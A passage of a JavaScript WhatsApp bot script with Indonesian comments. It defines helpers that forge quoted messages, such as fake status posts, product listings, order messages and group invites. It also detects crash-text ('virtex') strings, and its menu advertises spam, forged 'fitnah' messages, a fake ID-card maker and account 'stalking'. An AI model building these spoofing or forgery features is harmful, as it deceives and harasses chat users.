       hexa.sendMessage(from, hasil, type, options).catch(e => {
       hexa.sendMessage(from, { url : link }, type, options).catch(e => {
       reply('Error!')
       console.log(e)
       })
       })
       })
       })
       }
        const fakestatus = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            hexa.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted:ftoko,caption:yes})
        }
       const sendButLok = (id, text1, desc1, but = [], options = {}) => {
       tes = hexa.prepareMessage(from,  {degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: fs.readFileSync(`./lib/image/loli1.jpeg`)}, location)
        const buttonMessage = {
         locationMessage: tes.message.locationMessage,
          contentText: text1,
          footerText: desc1,
          buttons: but,
          headerType: 6,
        };
        hexa.sendMessage(
          id,
          buttonMessage,
          MessageType.buttonsMessage,
          options
        );
      };
        const fakegroup = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
   
//FAKEREPLY PRODUCT
const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./stik/thumb.jpeg`) //Gambarnye
					},
					"title": `${ucapanWaktu}\n`, //Kasih namalu 
					"description": "SELF BOT", 
					"currencyCode": "USD",
					"priceAmount1000": "999999999999999999999999 ",
					"retailerId": "*[𝒾𝒶𝓂𝒻𝒾𝓃𝑜𝒙菲诺 ]*",
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
//FAKEREPLY TROLI
const ftroli = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 999999999999,
                            status: 1,
                            surface : 9999999999999,
                            message:`𝑖𝑎𝑚 𝑓𝑖𝑛𝑜 菲诺𝟗𝟗𝟗`, //Kasih namalu
                            orderTitle: '𝚝𝚑𝚒𝚜𝚒𝚜𝚗𝚘𝚝𝚋𝚄𝚐',
                            thumbnail: fs.readFileSync('./stik/thumb.jpeg'), //Gambarnye
                            sellerJid: '0@s.whatsapp.net'
          
                          }
                        }
                      }
//FAKEREPLY LOCATION
const flokasi = { key : { participant : '0@s.whatsapp.net'}, message: {locationMessage: {name: 'Persimpangan surga-Neraka',jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`)}}}
                          
                       
                      
//FAKEREPLY DOCUMENT
const fdocs = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: '𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺', 
                    jpegThumbnail: fs.readFileSync('./stik/thumb.jpeg')
                          }
                        }
                      }
//FAKEREPLY VIDEO
const fvideo = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title":"hallo bang",
                 "h": `Hmm`,
                 'seconds': '9999999999999', 
                 'caption': `${ucapanWaktu} \n 𝒾𝒶𝓂𝒻𝒾𝓃𝑜𝒙菲诺 `,
                 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
                        }
                       }
	                  }
//FAKEREPLY GROUPINVITE
const fgclink = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": "953962993692",
			"groupName":"y",
            "caption": "𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺", 
            'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
		}
	}
}
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message":{
					"groupInviteMessage":{
						"groupJid": "6282223014661-1612197617@g.us",
						"inviteCode": "T04IYmOjakNhjJZw",
						"inviteExpiration": "9999999",
						"groupName": "🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿",
    }
  }
}
//FAKEREPLY GIF
const fgif = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title":"𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺",
                 "h": `Hmm`,
                 'seconds': '99999999999', 
                 'gifPlayback': 'true', 
                 'caption': '菲诺',
                 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
                        }
                       }
	                  } 
//FAKEREPLY TEXT WITH THUMBNAIL
const ftextt = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) }, message: { "extendedTextMessage": {"text":"hallo bang","title": `Hmm`, 'jpegThumbnail': fs.readFileSync(`./stik/thumb.jpeg`)}}}
                     
//FAKEREPLY VN
const fvn = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "${second}",
                 "ptt": "true"
                        }
	                  } 
                 }

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffm${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        hexa.sendMessage(to, media, MessageType.sticker,{quoted:ftoko})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    hexa.sendMessage(to, media, type, { quoted: ftroli, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   

    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }
    if (isGroup && isAntiLink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        hexa.groupRemove(from, [sender]);
      }
    }
//-- Cek fitur
const isLimit = (sender) => {
  let position = false
  for (let i of _limit) {
if (i.id === sender) {
  let limits = i.limit
  if (limits >= limitawal) {
position = true
return true
  } else {
_limit
position = true
return false
  }
}
  }
  if (position === false) {
const obj = {
  id: sender,
  limit: 1
}
_limit.push(obj)
fs.writeFileSync('./datauser/limit.json', JSON.stringify(_limit))
return false
  }
}

const checkLimit = (sender) => {
      let found = false
     for (let lmt of _limit) {
     if (lmt.id === sender) {
      limitCounts = limitawal - lmt.limit
     if (limitCounts <= 0) return hexa.sendMessage(from, `Maaf limit kamu telah habis, silahkan lakukan pembelian ulang`, text,{ quoted: mek})
      hexa.sendMessage(from, `〘  *Limit* 〙
Sisa limit anda : *${limitCounts}*
_Penggunaan limit hanya pada fitur-fitur tertentu_`, text, { quoted : mek})
      found = true
                                }
                        }
      if (found === false) {
      let obj = { id: sender, limit: 1 }
      _limit.push(obj)
     fs.writeFileSync('./datauser/limit.json', JSON.stringify(_limit))
     hexa.sendMessage(from, `〘  *Limit* 〙
Sisa limit anda : *${limitCounts}*
_Penggunaan limit hanya pada fitur-fitur tertentu_`, text, { quoted : mek})
                        }
                }

//--Bala

if (isRegister && isGroup) {
  const checkATM = checkATMuser(sender)
  try {
if (checkATM === undefined) addATM(sender)
const uangsaku = Math.floor(Math.random() * 10) + 90
addKoinUser(sender, uangsaku)
  } catch (err) {
console.error(err)
  }
}
//Anti virtex
if (messagesC.match("ผิดุท้่เึางืผิดุท้่เึาง")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        hexa.updatePresence(from, Presence.recording)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        hexa.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        hexa.updatePresence(from, Presence.recording)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("3detik")
		        }, 0)
	            }
	            if (messagesC.match("৭৭৭৭৭৭৭৭")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        hexa.updatePresence(from, Presence.recording)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        hexa.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        hexa.updatePresence(from, Presence.recording)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("3detik")
		        }, 0)
	            }
	            if (messagesC.match("๒๒๒๒๒๒๒๒")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        hexa.updatePresence(from, Presence.recording)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        hexa.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        hexa.updatePresence(from, Presence.recording)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("3detik")
		        }, 0)
	            }
	            if (messagesC.match("๑๑๑๑๑๑๑๑")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        hexa.updatePresence(from, Presence.recording)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        hexa.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        hexa.updatePresence(from, Presence.recording)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    hexa.updatePresence(from, Presence.recording)
			    reply("3detik")
		        }, 0)
	            }
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green','white']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
//Other function
const apakah = ['Ya',
  'Tidak',
  'Mungkin']
const bisakah = ['Bisa',
  'Tidak Bisa',
  'Mungkin']
const kapankah = ['Hari Lagi',
  'Minggu Lagi',
  'Bulan Lagi',
  'Tahun Lagi']
  
//Auto Respon teks

if (budy.match(`Salken`,`salken`,`Slkn`,`slkn`,`Slknn`,`slknn`)) {
reply(`Salken juga kak ${pushname} `) 
}
if (budy.match(`@6288210864298`)) {
reply(`Iya kak ${pushname} knp nge tag" owner ku? `) 
}
if (budy.match(`Hai`,'hai',`hi`,`Hi`,`Hay`,`hay`,`hy`)) {
reply(`Hai juga kak ${pushname}`) 
}
//Auto resoon suara


//Auto respon sticker
if (!mek.key.fromMe && banChats === true) return
if (budy.match(`Hai`,'hai',`hi`,`Hi`,`Hay`,`hay`,`hy`)) {
reply(`Hai juga kak ${pushname}`) 
}

switch (command) {
case 'menu':
 case 'button':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
     nomor = `6288210864298@s.whatsapp.net`
      run = process.uptime()
var thumbnaill = fs.readFileSync('./stik/thumb.jpeg')
		var media = await hexa.prepareMessage(from, thumbnaill, MessageType.image)
media.message = (Object.keys(media.message)[0] === 'ephemeralMessage') ? media.message.ephemeralMessage.message : media.message
	var buttonsss = [
		{buttonId: `${prefix}owner`, buttonText: {displayText: '👤 𝑶𝑾𝑵𝑬𝑹'}, type: 1},
		{buttonId: `${prefix}stat`, buttonText: {displayText: '⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪'}, type: 1},
  {buttonId: `${prefix}source`, buttonText: {displayText: '🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻'}, type: 1}

		]
		var buttonMessageee = {
		contentText: `${ucapanWaktu} ${pushname}\n┏━━━━❒ *[ 𝚆𝙰𝙺𝚃𝚄 ]*
┣➣Hari : ${tampilHari}
┣➣Jam : *[ ${time} WIB ]*
┣➣Jam : *[ ${wit} WIT ] *
┣➣Jam : *[ ${wita} WITA ]*
┗━━━━ ❒ [ ${namaBot} ]
More??...${readmore}    
		*[ 𝙼𝙰𝙺𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}sticker_
┣ ◩ _${prefix}swm_ <author|packname>
┣ ◩ _${prefix}take_ <author|packname>
┣ ◩ _${prefix}fdeface_
┣ ◩ _${prefix}ttp_
┣ ◩ _${prefix}ttp2
┣ ◩ _${prefix}ttp3_
┣ ◩ _${prefix}ttp4_
┣ ◩ _${prefix}fakedonald_
┣ ◩ _${prefix}ktpmaker_
┣ ◩ _${prefix}smoji_ <emoji>
┣ ◩ _${prefix}smoji2_ <emoji>
┣ ◩ _${prefix}wasted_ 
┣ ◩ _${prefix}triggered_
┗━━━━━━━━ ❑


     *[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}toimg_
┣ ◩ _${prefix}tomp3_
┣ ◩ _${prefix}tomp4_
┣ ◩ _${prefix}slow_
┣ ◩ _${prefix}fast_
┣ ◩ _${prefix}reverse_
┣ ◩ _${prefix}tourl_
┗━━━━━━━━ ❑

   *[ 𝙶𝙴𝚃 𝙸𝙼𝙶, 𝚅𝙽, 𝚂𝚃𝙸𝙺 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}getvn_
┣ ◩ _${prefix}listvn_
┣ ◩ _${prefix}getstik_
┣ ◩ _${prefix}liststik_
┣ ◩ _${prefix}getimg_
┣ ◩ _${prefix}listimg
┗━━━━━━━━ ❑

   *[ 𝙶𝙰𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒ < Lagi apdet santay aja >
┣ ◩ _${prefix}slot_ (Dalam perbaikan)
┣ ◩ _${prefix}tictacto_ (Dalam perbaikan)
┣ ◩ _${prefix}lesbicek_
┣ ◩ _${prefix}gaycek_
┣ ◩ _${prefix}gantengcek_
┣ ◩ _${prefix}cantikcek_
┗━━━━━━━━ ❑

     *[ 𝟏𝟖+ 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒ < Premium only >
┣ ◩ _${prefix}xhamster_
┣ ◩ _${prefix}xhamstersearch_ <query>
┣ ◩ _${prefix}xnxx_
┣ ◩ _${prefix}xnxxsearch_ <query>
┣ ◩ _${prefix}nhentai_
┣ ◩ _${prefix}nhentaisearch_ < kode >
┣ ◩ _${prefix}nhentaipdf_
┣ ◩ _${prefix}nekopoi_
┣ ◩ _${prefix}nekopoisearch_ <query>
┗━━━━━━━━ ❑


 *[ 𝚁𝙰𝙽𝙳𝙾𝙼 𝙸𝙼𝙰𝙶𝙴 & 𝙼𝙰𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}18+image_
┣ ◩ _${prefix}18+image2_
┣ ◩ _${prefix}textpro_
┣ ◩ _${prefix}textpro2_
┣ ◩ _${prefix}logomaker_
┣ ◩ _${prefix}ephoto_
┗━━━━━━━━ ❑ 


     *[ 𝙰𝙽𝙸𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}art_
┣ ◩ _${prefix}bts_
┣ ◩ _${prefix}exo_
┣ ◩ _${prefix}elf_
┣ ◩ _${prefix}loli_
┣ ◩ _${prefix}neko_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}shota_
┣ ◩ _${prefix}husbu_
┣ ◩ _${prefix}sagiri_
┣ ◩ _${prefix}shinobu_
┣ ◩ _${prefix}megumin_
┣ ◩ _${prefix}wallnime_
┣ ◩ _${prefix}character_
┣ ◩ _${prefix}manga_
┣ ◩ _${prefix}kusonime_
┣ ◩ _${prefix}kusonimesearch_ <query>
┣ ◩ _${prefix}otakudesu_
┣ ◩ _${prefix}otakudesusearch_ <query>
┣ ◩ _${prefix}anime_
┣ ◩ _${prefix}pixiv_
┣ ◩ _${prefix}pixivdl_
┣ ◩ _${prefix}chara_
┣ ◩ _${prefix}otaku_
┗━━━━━━━━ ❑


      *[ 𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}afk_ < alesan nya >
┣ ◩ _${prefix}on_ 
┣ ◩ _${prefix}tospam_
┣ ◩ _${prefix}spam_
┣ ◩ _${prefix}wikipedia_
┣ ◩ _${prefix}herodetail_
┣ ◩ _${prefix}listhero_
┣ ◩ _${prefix}lirk3
┣ ◩ _${prefix}playstore_
┣ ◩ _${prefix}playstore2_
┣ ◩ _${prefix}shopee_
┣ ◩ _${prefix}infofilm_
┣ ◩ _${prefix}lk21_
┣ ◩ _${prefix}ssweb_
┣ ◩ _${prefix}shortlink_
┣ ◩ _${prefix}ssweb2_
┣ ◩ _${prefix}ceritahoror_ <random>
┣ ◩ _${prefix}wattpad_
┣ ◩ _${prefix}wattpadsearch_ <query>
┣ ◩ _${prefix}drakorongoing_
┣ ◩ _${prefix}covidindo_
┣ ◩ _${prefix}covidglobal_
┣ ◩ _${prefix}asupan_ <random>
┣ ◩ _${prefix}wancak_
┣ ◩ _${prefix}faketoko_
┣ ◩ _${prefix}cuaca_
┣ ◩ _${prefix}infogempa_
┣ ◩ _${prefix}cnninternasional_
┣ ◩ _${prefix}cnnnasional_
┣ ◩ _${prefix}cnnindonesia_
┣ ◩ _${prefix}newsinfo_
┣ ◩ _${prefix}cerpen_
┣ ◩ _${prefix}stickerwa_ <query>
┣ ◩ _${prefix}google_ <query
┣ ◩ _${prefix}lirik_
┣ ◩ _${prefix}lirik2_
┣ ◩ _${prefix}kbbi_
┣ ◩ _${prefix}wikipedia_
┣ ◩ _${prefix}jadwaltv_
┣ ◩ _${prefix}jadwaltvnow_
┣ ◩ _${prefix}jadwalbola_
┣ ◩ _${prefix}kodepos_ <query>
┣ ◩ _${prefix}telesticker_
┗━━━━━━━━ ❑


   *[ 𝙶𝚁𝙾𝚄𝙿 ]*
┏━━━━━━━ ❒
┣>>>    > ONLY ADMIN < 
┣ ◩ _${prefix}welcome_ <1/0>
┣ ◩ _${prefix}antibule_ <1/0>
┣ ◩ _${prefix}antihidetag_ <1/0>
┣ ◩ _${prefix}antilink_ <1/0>
┣ ◩ _${prefix}antivirtex_ <on/off>
┣ ◩ _${prefix}nsfw_ <on/off>
┣ ◩ _${prefix}antiviewonce_ < Error >
┣ ◩ _${prefix}group_ (open/close)
┣ ◩ _${prefix}add_ <tag>
┣ ◩ _${prefix}kick_ <tag>
┣ ◩ _${prefix}demote_ <tag>
┣ ◩ _${prefix}promote_ <tag>
┣ ◩ _${prefix}add2_ <reply>
┣ ◩ _${prefix}kick2_ <reply>
┣ ◩ _${prefix}demote2_ <reply>
┣ ◩ _${prefix}promote2_ <reply>
┣ ◩ _${prefix}tagall_
┣ ◩ _${prefix}tagall2_
┣ ◩ _${prefix}tagall3_
┣ ◩ _${prefix}tagall4_
┣ ◩ _${prefix}tagall5_
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}kontag_
┣ ◩ _${prefix}sticktag_
┣ ◩ _${prefix}totag_
┣ ◩ _${prefix}notif_ 
┣ ◩ _${prefix}grup_ (open/close)
┣ ◩ _${prefix}setdesk_
┣ ◩ _${prefix}setname_
┣ ◩ _${prefix}setppgc_
┣ ◩ _${prefix}tutuptimer_
┣ ◩ _${prefix}timer_
┣ ◩ _${prefix}hacked_ 
┣ ◩ _${prefix}repeatag_
┣ ◩ _${prefix}sider_
┣ ◩ _${prefix}listadmin_
┣ ◩ _${prefix}listonline_
┗━━━━━━━━ ❑


    *[ 𝙸𝚂𝙻𝙰𝙼 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}asmaulhusna_ <query>
┣ ◩ _${prefix}kisahnabi_ <query>
┣ ◩ _${prefix}jadwalsholat_ <query>
┣ ◩ _${prefix}alquran_
┣ ◩ _${prefix}alquranaudio_
┣ ◩ _${prefix}listsurah_
┗━━━━━━━━ ❑

    *[ 𝙵𝚄𝙽 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}fitnah_
┣ ◩ _${prefix}fitnahpc_
┣ ◩ _${prefix}kontak_
┗━━━━━━━━ ❑

    *[ 𝚃𝙰𝙶 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}kontag_
┣ ◩ _${prefix}sticktag_
┣ ◩ _${prefix}totag_
┗━━━━━━━━ ❑

  *[ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igstalk_ <query>
┣ ◩ _${prefix}tiktokstalk_ <query>
┣ ◩ _${prefix}tiktokstalk2_ <query>
┣ ◩ _${prefix}githubstalk_ <query>
┣ ◩ _${prefix}twitterstalk_ <query>
┗━━━━━━━━ ❑

     *[ 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}mediafire_
┣ ◩ _${prefix}tiktok2_
┣ ◩ _${prefix}tiktokdl_
┣ ◩ _${prefix}ytsearch_ <query>
┣ ◩ _${prefix}play_ <query>
┣ ◩ _${prefix}spotify_ <quert>
